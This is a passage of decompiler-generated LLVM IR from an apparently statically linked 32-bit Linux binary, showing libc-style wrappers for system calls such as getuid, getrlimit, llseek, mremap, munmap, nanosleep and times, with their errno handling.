205, 206, 207, 208, 209, 210, 211, 212, 16, 213, 17, 214, 18, 215, 19, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 20, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 265, 264, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 297, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 4, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 22, 333, 334, 335, 336, 327, 328, 329, 330, 27, 337, 338, 339, 340, 26, 345, 346, 347, 348, 37, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 341, 342, 343, 344, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 28, 374, 375, 376, 38, 377, 378, 379, 380, 381, 382, 383, 385, 384, 5, 386, 387, 388, 389, 390, 391, 392, 393, 25, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 36, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 21, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 30, 29, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 31, 457, 458, 459, 460, 461, 462, 463, 32, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 33, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 34, 484, 485, 35, 486, 487, 488, 489, 490, 491, 492, 493, 494, 24, 39, 495, 496, 497, 498, 499, 500, 501, 40, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 41, 601, 602, 603, 604, 605, 606, 607, 608, 42, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 23, 626, 627, 628 }
  uselistorder i32 15, { 4, 3, 9, 1, 0, 2, 5, 6, 7, 8 }
  uselistorder i32 -16, { 14, 46, 136, 137, 19, 20, 66, 67, 68, 69, 47, 48, 51, 15, 56, 57, 62, 63, 64, 65, 58, 59, 54, 18, 52, 17, 49, 50, 60, 61, 21, 70, 71, 72, 73, 55, 53, 16, 22, 23, 74, 75, 24, 25, 77, 76, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 133, 94, 93, 45, 92, 2, 104, 3, 27, 38, 120, 28, 105, 33, 31, 107, 32, 1, 26, 103, 29, 106, 30, 4, 12, 43, 44, 122, 11, 123, 124, 39, 40, 121, 41, 125, 42, 108, 5, 109, 34, 110, 35, 111, 6, 112, 7, 113, 114, 8, 115, 116, 9, 117, 118, 36, 119, 10, 37, 126, 127, 95, 96, 97, 98, 99, 100, 101, 102, 128, 129, 130, 131, 138, 0, 132, 13, 134, 135 }
  uselistorder i32 30, { 6, 4, 2, 1, 5, 3, 0 }
  uselistorder i32 %arg3, { 0, 3, 2, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805503d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055038, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8054f9a, { 1, 0 }
}

define i32 @function_8055045() local_unnamed_addr {
dec_label_pc_8055045:
  %stack_var_-8 = alloca i32, align 4
  %v2_8055048 = ptrtoint i32* %stack_var_-8 to i32
  %v2_805504f = call i32 @function_80550ef(i32 7, i32 %v2_8055048)
  store i32 256, i32* @edx, align 4
  %v2_805505c = icmp slt i32 %v2_805504f, 0
  br i1 %v2_805505c, label %dec_label_pc_8055064, label %dec_label_pc_8055060

dec_label_pc_8055060:                             ; preds = %dec_label_pc_8055045
  %v3_8055060 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8055060, i32* @edx, align 4
  br label %dec_label_pc_8055064

dec_label_pc_8055064:                             ; preds = %dec_label_pc_8055045, %dec_label_pc_8055060
  %v0_8055064 = phi i32 [ 256, %dec_label_pc_8055045 ], [ %v3_8055060, %dec_label_pc_8055060 ]
  ret i32 %v0_8055064

; uselistorder directives
  uselistorder i32 7, { 7, 17, 0, 1, 3, 8, 4, 9, 5, 10, 6, 11, 19, 20, 18, 21, 22, 23, 14, 12, 15, 16, 24, 25, 13, 26, 27, 2 }
  uselistorder label %dec_label_pc_8055064, { 1, 0 }
}

define i32 @function_805506a() local_unnamed_addr {
dec_label_pc_805506a:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805506a = load i32, i32* @ebx, align 4
  store i32 %v0_805506a, i32* %stack_var_-4, align 4
  %v1_8055073 = call i32 @int80_syscall(i32 202)
  store i32 %v1_8055073, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8055073, -4095
  br i1 %tmp7, label %dec_label_pc_805508a, label %dec_label_pc_805507e

dec_label_pc_805507e:                             ; preds = %dec_label_pc_805506a
  %v1_805507e = call i32 @function_80530f9(i32 %v0_805506a)
  %v0_8055083 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8055083 = sub i32 0, %v0_8055083
  %v2_8055085 = inttoptr i32 %v1_805507e to i32*
  store i32 %v1_8055083, i32* %v2_8055085, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_805508e.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805508a

dec_label_pc_805508a:                             ; preds = %dec_label_pc_805506a, %dec_label_pc_805507e
  %v2_805508e = phi i32 [ %v0_805506a, %dec_label_pc_805506a ], [ %v2_805508e.pre, %dec_label_pc_805507e ]
  %v0_805508a = phi i32 [ %v1_8055073, %dec_label_pc_805506a ], [ -1, %dec_label_pc_805507e ]
  store i32 %v2_805508e, i32* @ebx, align 4
  ret i32 %v0_805508a

; uselistorder directives
  uselistorder i32 %v1_8055073, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805508a, { 1, 0 }
}

define i32 @function_8055090() local_unnamed_addr {
dec_label_pc_8055090:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8055090 = load i32, i32* @ebx, align 4
  store i32 %v0_8055090, i32* %stack_var_-4, align 4
  %v1_8055099 = call i32 @int80_syscall(i32 201)
  store i32 %v1_8055099, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8055099, -4095
  br i1 %tmp7, label %dec_label_pc_80550b0, label %dec_label_pc_80550a4

dec_label_pc_80550a4:                             ; preds = %dec_label_pc_8055090
  %v1_80550a4 = call i32 @function_80530f9(i32 %v0_8055090)
  %v0_80550a9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80550a9 = sub i32 0, %v0_80550a9
  %v2_80550ab = inttoptr i32 %v1_80550a4 to i32*
  store i32 %v1_80550a9, i32* %v2_80550ab, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80550b4.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80550b0

dec_label_pc_80550b0:                             ; preds = %dec_label_pc_8055090, %dec_label_pc_80550a4
  %v2_80550b4 = phi i32 [ %v0_8055090, %dec_label_pc_8055090 ], [ %v2_80550b4.pre, %dec_label_pc_80550a4 ]
  %v0_80550b0 = phi i32 [ %v1_8055099, %dec_label_pc_8055090 ], [ -1, %dec_label_pc_80550a4 ]
  store i32 %v2_80550b4, i32* @ebx, align 4
  ret i32 %v0_80550b0

; uselistorder directives
  uselistorder i32 %v1_8055099, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80550b0, { 1, 0 }
}

define i32 @function_80550b6() local_unnamed_addr {
dec_label_pc_80550b6:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80550b6 = load i32, i32* @ebx, align 4
  store i32 %v0_80550b6, i32* %stack_var_-4, align 4
  %v1_80550bf = call i32 @int80_syscall(i32 200)
  store i32 %v1_80550bf, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_80550bf, -4095
  br i1 %tmp7, label %dec_label_pc_80550d6, label %dec_label_pc_80550ca

dec_label_pc_80550ca:                             ; preds = %dec_label_pc_80550b6
  %v1_80550ca = call i32 @function_80530f9(i32 %v0_80550b6)
  %v0_80550cf = load i32, i32* %ebx.global-to-local, align 4
  %v1_80550cf = sub i32 0, %v0_80550cf
  %v2_80550d1 = inttoptr i32 %v1_80550ca to i32*
  store i32 %v1_80550cf, i32* %v2_80550d1, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80550da.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80550d6

dec_label_pc_80550d6:                             ; preds = %dec_label_pc_80550b6, %dec_label_pc_80550ca
  %v2_80550da = phi i32 [ %v0_80550b6, %dec_label_pc_80550b6 ], [ %v2_80550da.pre, %dec_label_pc_80550ca ]
  %v0_80550d6 = phi i32 [ %v1_80550bf, %dec_label_pc_80550b6 ], [ -1, %dec_label_pc_80550ca ]
  store i32 %v2_80550da, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80550d6

; uselistorder directives
  uselistorder i32 %v1_80550bf, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80550d6, { 1, 0 }
}

define i32 @function_80550dc() local_unnamed_addr {
dec_label_pc_80550dc:
  %v0_80550dc = load i32, i32* @global_var_8057304.239, align 4
  %v1_80550e6 = icmp eq i32 %v0_80550dc, 0
  br i1 %v1_80550e6, label %dec_label_pc_80550ec, label %dec_label_pc_80550ea

dec_label_pc_80550ea:                             ; preds = %dec_label_pc_80550dc
  br label %dec_label_pc_80550ec

dec_label_pc_80550ec:                             ; preds = %dec_label_pc_80550dc, %dec_label_pc_80550ea
  %storemerge = phi i32 [ %v0_80550dc, %dec_label_pc_80550ea ], [ 4096, %dec_label_pc_80550dc ]
  %v0_80550ec = phi i32 [ %v0_80550dc, %dec_label_pc_80550ea ], [ 4096, %dec_label_pc_80550dc ]
  store i32 %storemerge, i32* @edx, align 4
  ret i32 %v0_80550ec

; uselistorder directives
  uselistorder i32 4096, { 0, 1, 11, 12, 2, 7, 5, 6, 8, 9, 10, 3, 4 }
  uselistorder label %dec_label_pc_80550ec, { 1, 0 }
}

define i32 @function_80550ef(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80550ef:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80550ef = load i32, i32* @ebx, align 4
  store i32 %v0_80550ef, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_8055102 = call i32 @int80_syscall(i32 191)
  store i32 %v1_8055102, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v1_8055102, -4095
  br i1 %tmp9, label %dec_label_pc_805511b, label %dec_label_pc_805510f

dec_label_pc_805510f:                             ; preds = %dec_label_pc_80550ef
  %v1_805510f = call i32 @function_80530f9(i32 %v0_80550ef)
  %v0_8055114 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8055114 = sub i32 0, %v0_8055114
  %v2_8055116 = inttoptr i32 %v1_805510f to i32*
  store i32 %v1_8055114, i32* %v2_8055116, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_805511f.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805511b

dec_label_pc_805511b:                             ; preds = %dec_label_pc_80550ef, %dec_label_pc_805510f
  %v2_805511f = phi i32 [ %v0_80550ef, %dec_label_pc_80550ef ], [ %v2_805511f.pre, %dec_label_pc_805510f ]
  %v0_805511b = phi i32 [ %v1_8055102, %dec_label_pc_80550ef ], [ -1, %dec_label_pc_805510f ]
  store i32 %v2_805511f, i32* %ebx.global-to-local, align 4
  ret i32 %v0_805511b

; uselistorder directives
  uselistorder i32 %v1_8055102, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805511b, { 1, 0 }
}

define i32 @function_8055121() local_unnamed_addr {
dec_label_pc_8055121:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8055121 = load i32, i32* @ebx, align 4
  store i32 %v0_8055121, i32* %stack_var_-4, align 4
  %v1_805512a = call i32 @int80_syscall(i32 199)
  store i32 %v1_805512a, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_805512a, -4095
  br i1 %tmp7, label %dec_label_pc_8055141, label %dec_label_pc_8055135

dec_label_pc_8055135:                             ; preds = %dec_label_pc_8055121
  %v1_8055135 = call i32 @function_80530f9(i32 %v0_8055121)
  %v0_805513a = load i32, i32* %ebx.global-to-local, align 4
  %v1_805513a = sub i32 0, %v0_805513a
  %v2_805513c = inttoptr i32 %v1_8055135 to i32*
  store i32 %v1_805513a, i32* %v2_805513c, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8055145.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8055141

dec_label_pc_8055141:                             ; preds = %dec_label_pc_8055121, %dec_label_pc_8055135
  %v2_8055145 = phi i32 [ %v0_8055121, %dec_label_pc_8055121 ], [ %v2_8055145.pre, %dec_label_pc_8055135 ]
  %v0_8055141 = phi i32 [ %v1_805512a, %dec_label_pc_8055121 ], [ -1, %dec_label_pc_8055135 ]
  store i32 %v2_8055145, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8055141

; uselistorder directives
  uselistorder i32 %v1_805512a, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8055141, { 1, 0 }
}

define i32 @function_8055147(i32 %arg1) local_unnamed_addr {
dec_label_pc_8055147:
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %v2_805515d = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_805515d, i32* %esi.global-to-local, align 4
  %v1_8055174 = call i32 @int80_syscall(i32 140)
  store i32 %v1_8055174, i32* %esi.global-to-local, align 4
  %tmp18 = icmp ult i32 %v1_8055174, -4095
  br i1 %tmp18, label %dec_label_pc_805518e, label %dec_label_pc_8055180

dec_label_pc_8055180:                             ; preds = %dec_label_pc_8055147
  %v2_8055161 = ashr i32 %tmp8, 31
  %v1_8055180 = call i32 @function_80530f9(i32 %v2_8055161)
  %v0_8055185 = load i32, i32* %esi.global-to-local, align 4
  %v1_8055185 = sub i32 0, %v0_8055185
  %v2_8055187 = inttoptr i32 %v1_8055180 to i32*
  store i32 %v1_8055185, i32* %v2_8055187, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8055192

dec_label_pc_805518e:                             ; preds = %dec_label_pc_8055147
  %v1_805518e = icmp eq i32 %v1_8055174, 0
  br i1 %v1_805518e, label %dec_label_pc_8055197, label %dec_label_pc_8055192

dec_label_pc_8055192:                             ; preds = %dec_label_pc_805518e, %dec_label_pc_8055180
  %v0_8055192 = phi i32 [ %v1_8055174, %dec_label_pc_805518e ], [ -1, %dec_label_pc_8055180 ]
  %v1_8055194 = ashr i32 %v0_8055192, 31
  br label %dec_label_pc_805519f

dec_label_pc_8055197:                             ; preds = %dec_label_pc_805518e
  %v3_8055197 = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_805519f

dec_label_pc_805519f:                             ; preds = %dec_label_pc_8055192, %dec_label_pc_8055197
  %v0_80551a5 = phi i32 [ %v0_8055192, %dec_label_pc_8055192 ], [ %v3_8055197, %dec_label_pc_8055197 ]
  %storemerge = phi i32 [ %v1_8055194, %dec_label_pc_8055192 ], [ %tmp, %dec_label_pc_8055197 ]
  store i32 %storemerge, i32* @edx, align 4
  ret i32 %v0_80551a5

; uselistorder directives
  uselistorder i32 %v1_8055174, { 1, 2, 0, 3 }
  uselistorder i32 31, { 9, 10, 6, 1, 2, 3, 4, 7, 5, 8, 0, 11 }
  uselistorder i32 140, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805519f, { 1, 0 }
}

define i32 @function_80551a6(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_80551a6:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80551a7 = load i32, i32* @esi, align 4
  store i32 %v0_80551a7, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_80551bf = load i32, i32* @ebx, align 4
  %v5_80551c7 = call i32* (i32*, i32, i32, i32, ...) @mremap(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4)
  %v6_80551c7 = ptrtoint i32* %v5_80551c7 to i32
  store i32 %v0_80551bf, i32* @ebx, align 4
  store i32 %v6_80551c7, i32* %esi.global-to-local, align 4
  %tmp13 = icmp ugt i32* %v5_80551c7, inttoptr (i32 -4096 to i32*)
  br i1 %tmp13, label %dec_label_pc_80551d3, label %dec_label_pc_80551df

dec_label_pc_80551d3:                             ; preds = %dec_label_pc_80551a6
  %v1_80551d3 = call i32 @function_80530f9(i32 %v0_80551bf)
  %v0_80551d8 = load i32, i32* %esi.global-to-local, align 4
  %v1_80551d8 = sub i32 0, %v0_80551d8
  %v2_80551da = inttoptr i32 %v1_80551d3 to i32*
  store i32 %v1_80551d8, i32* %v2_80551da, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_80551e2.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_80551df

dec_label_pc_80551df:                             ; preds = %dec_label_pc_80551a6, %dec_label_pc_80551d3
  %v2_80551e2 = phi i32 [ %v0_80551a7, %dec_label_pc_80551a6 ], [ %v2_80551e2.pre, %dec_label_pc_80551d3 ]
  %v0_80551df = phi i32 [ %v6_80551c7, %dec_label_pc_80551a6 ], [ -1, %dec_label_pc_80551d3 ]
  %v2_80551e1 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80551e1, i32* @edx, align 4
  store i32 %v2_80551e2, i32* @esi, align 4
  ret i32 %v0_80551df

; uselistorder directives
  uselistorder i32 %v0_80551bf, { 1, 0 }
  uselistorder label %dec_label_pc_80551df, { 1, 0 }
}

define i32 @function_80551e5(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80551e5:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80551e5 = load i32, i32* @ebx, align 4
  store i32 %v0_80551e5, i32* %stack_var_-4, align 4
  store i32 %tmp4, i32* %ebx.global-to-local, align 4
  %v3_80551f8 = call i32 @munmap(i32* %arg1, i32 %arg2)
  store i32 %v3_80551f8, i32* %ebx.global-to-local, align 4
  %tmp10 = icmp ult i32 %v3_80551f8, -4095
  br i1 %tmp10, label %dec_label_pc_8055211, label %dec_label_pc_8055205

dec_label_pc_8055205:                             ; preds = %dec_label_pc_80551e5
  %v1_8055205 = call i32 @function_80530f9(i32 %v0_80551e5)
  %v0_805520a = load i32, i32* %ebx.global-to-local, align 4
  %v1_805520a = sub i32 0, %v0_805520a
  %v2_805520c = inttoptr i32 %v1_8055205 to i32*
  store i32 %v1_805520a, i32* %v2_805520c, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8055215.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8055211

dec_label_pc_8055211:                             ; preds = %dec_label_pc_80551e5, %dec_label_pc_8055205
  %v2_8055215 = phi i32 [ %v0_80551e5, %dec_label_pc_80551e5 ], [ %v2_8055215.pre, %dec_label_pc_8055205 ]
  %v0_8055211 = phi i32 [ %v3_80551f8, %dec_label_pc_80551e5 ], [ -1, %dec_label_pc_8055205 ]
  %v2_8055213 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8055213, i32* @edx, align 4
  store i32 %v2_8055215, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8055211

; uselistorder directives
  uselistorder i32 %v3_80551f8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8055211, { 1, 0 }
}

define i32 @function_8055217(%timespec* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8055217:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = inttoptr i32 %arg2 to %timespec*
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8055217 = load i32, i32* @ebx, align 4
  store i32 %v0_8055217, i32* %stack_var_-4, align 4
  %v4_805521b = ptrtoint %timespec* %arg1 to i32
  store i32 %v4_805521b, i32* %ebx.global-to-local, align 4
  %v6_805522a = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp4)
  store i32 %v6_805522a, i32* %ebx.global-to-local, align 4
  %tmp11 = icmp ult i32 %v6_805522a, -4095
  br i1 %tmp11, label %dec_label_pc_8055243, label %dec_label_pc_8055237

dec_label_pc_8055237:                             ; preds = %dec_label_pc_8055217
  %v1_8055237 = call i32 @function_80530f9(i32 %v0_8055217)
  %v0_805523c = load i32, i32* %ebx.global-to-local, align 4
  %v1_805523c = sub i32 0, %v0_805523c
  %v2_805523e = inttoptr i32 %v1_8055237 to i32*
  store i32 %v1_805523c, i32* %v2_805523e, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8055247.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8055243

dec_label_pc_8055243:                             ; preds = %dec_label_pc_8055217, %dec_label_pc_8055237
  %v2_8055247 = phi i32 [ %v0_8055217, %dec_label_pc_8055217 ], [ %v2_8055247.pre, %dec_label_pc_8055237 ]
  %v0_8055243 = phi i32 [ %v6_805522a, %dec_label_pc_8055217 ], [ -1, %dec_label_pc_8055237 ]
  %v2_8055245 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8055245, i32* @edx, align 4
  store i32 %v2_8055247, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8055243

; uselistorder directives
  uselistorder i32 %v6_805522a, { 1, 0, 2 }
  uselistorder %timespec* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8055243, { 1, 0 }
}

define i32 @function_8055249(i32 %arg1) local_unnamed_addr {
dec_label_pc_8055249:
  %stack_var_-12 = alloca i32, align 4
  %v0_805524a = load i32, i32* @ebx, align 4
  %v0_805524e = load i32, i32* @global_var_8057318.246, align 8
  %v1_805524e = icmp eq i32 %v0_805524e, 0
  %v1_8055259 = icmp eq i1 %v1_805524e, false
  br i1 %v1_8055259, label %dec_label_pc_805526c, label %dec_label_pc_805525b

dec_label_pc_805525b:                             ; preds = %dec_label_pc_8055249
  %v1_8055260 = call i32 @function_805540f(i32 0)
  %v2_8055268 = icmp slt i32 %v1_8055260, 0
  br i1 %v2_8055268, label %dec_label_pc_805528e, label %dec_label_pc_805525b.dec_label_pc_805526c_crit_edge

dec_label_pc_805525b.dec_label_pc_805526c_crit_edge: ; preds = %dec_label_pc_805525b
  %v0_805526e.pre = load i32, i32* @global_var_8057318.246, align 8
  br label %dec_label_pc_805526c

dec_label_pc_805526c:                             ; preds = %dec_label_pc_805525b.dec_label_pc_805526c_crit_edge, %dec_label_pc_8055249
  %v0_805527c = phi i32 [ %v0_805526e.pre, %dec_label_pc_805525b.dec_label_pc_805526c_crit_edge ], [ %v0_805524e, %dec_label_pc_8055249 ]
  %v1_805526c = icmp eq i32 %arg1, 0
  %v1_8055273 = icmp eq i1 %v1_805526c, false
  br i1 %v1_8055273, label %dec_label_pc_8055279, label %dec_label_pc_8055275

dec_label_pc_8055275:                             ; preds = %dec_label_pc_805526c
  br label %dec_label_pc_8055291

dec_label_pc_8055279:                             ; preds = %dec_label_pc_805526c
  store i32 %v0_805527c, i32* @ebx, align 4
  %v2_805527e = add i32 %v0_805527c, %arg1
  %v1_8055282 = call i32 @function_805540f(i32 %v2_805527e)
  %v2_805528a = icmp slt i32 %v1_8055282, 0
  %v1_805528c = icmp eq i1 %v2_805528a, false
  br i1 %v1_805528c, label %dec_label_pc_8055279.dec_label_pc_8055291_crit_edge, label %dec_label_pc_805528e

dec_label_pc_8055279.dec_label_pc_8055291_crit_edge: ; preds = %dec_label_pc_8055279
  %v0_8055291.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8055291

dec_label_pc_805528e:                             ; preds = %dec_label_pc_8055279, %dec_label_pc_805525b
  br label %dec_label_pc_8055291

dec_label_pc_8055291:                             ; preds = %dec_label_pc_8055279.dec_label_pc_8055291_crit_edge, %dec_label_pc_8055275, %dec_label_pc_805528e
  %v0_8055291 = phi i32 [ %v0_8055291.pre, %dec_label_pc_8055279.dec_label_pc_8055291_crit_edge ], [ %v0_805527c, %dec_label_pc_8055275 ], [ -1, %dec_label_pc_805528e ]
  %v2_8055293 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8055293, i32* @edx, align 4
  store i32 %v0_805524a, i32* @ebx, align 4
  ret i32 %v0_8055291

; uselistorder directives
  uselistorder i32 %v0_805527c, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_805540f, { 1, 0 }
  uselistorder label %dec_label_pc_8055291, { 2, 0, 1 }
}

define i32 @function_8055297(%tms* %arg1) local_unnamed_addr {
dec_label_pc_8055297:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8055297 = load i32, i32* @edi, align 4
  store i32 %v0_8055297, i32* %stack_var_-4, align 4
  %v4_805529b = ptrtoint %tms* %arg1 to i32
  store i32 %v4_805529b, i32* %edi.global-to-local, align 4
  %v0_805529f = load i32, i32* @ebx, align 4
  %v3_80552a7 = call i32 @times(%tms* %arg1)
  store i32 %v3_80552a7, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v3_80552a7, -4095
  br i1 %tmp9, label %dec_label_pc_80552bf, label %dec_label_pc_80552b3

dec_label_pc_80552b3:                             ; preds = %dec_label_pc_8055297
  %v1_80552b3 = call i32 @function_80530f9(i32 %v0_805529f)
  %v0_80552b8 = load i32, i32* %edi.global-to-local, align 4
  %v1_80552b8 = sub i32 0, %v0_80552b8
  %v2_80552ba = inttoptr i32 %v1_80552b3 to i32*
  store i32 %v1_80552b8, i32* %v2_80552ba, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_80552c3.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80552bf

dec_label_pc_80552bf:                             ; preds = %dec_label_pc_8055297, %dec_label_pc_80552b3
  %v2_80552c3 = phi i32 [ %v0_8055297, %dec_label_pc_8055297 ], [ %v2_80552c3.pre, %dec_label_pc_80552b3 ]
  %v0_80552bf = phi i32 [ %v3_80552a7, %dec_label_pc_8055297 ], [ -1, %dec_label_pc_80552b3 ]
  store i32 %v2_80552c3, i32* %edi.global-to-local, align 4
  ret i32 %v0_80552bf

; uselistorder directives
  uselistorder i32 %v3_80552a7, { 1, 0, 2 }
  uselistorder i32* @edi, { 8, 112, 113, 114, 115, 116, 171, 7, 172, 173, 174, 175, 1, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 91, 92, 93, 94, 95, 96, 97, 98, 99, 194, 208, 209, 195, 196, 197, 198, 199, 200, 201, 202, 2, 203, 204, 205, 206, 207, 210, 211, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 9, 130, 131, 212, 213, 132, 133, 134, 135, 10, 214, 215, 11, 216, 217, 218, 219, 136, 3, 137, 138, 18, 19, 20, 21, 56, 57, 58, 59, 60, 61, 62, 63, 49, 50, 51, 22, 23, 24, 25, 26, 64, 65, 66, 37, 38, 39, 12, 13, 14, 34, 35, 36, 40, 41, 42, 43, 44, 45, 46, 47, 68, 69, 70, 55, 71, 72, 73, 52, 15, 16, 17, 67, 27, 28, 29, 30, 31, 32, 33, 48, 53, 54, 74, 75, 76, 77, 78, 79, 0, 6, 90, 80, 81, 82, 83, 84, 85, 86, 87, 89, 88, 4, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 170, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 5, 168, 169, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 242, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272 }
  uselistorder %tms* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80552bf, { 1, 0 }
}

define i32 @function_80552c5(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80552c5:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
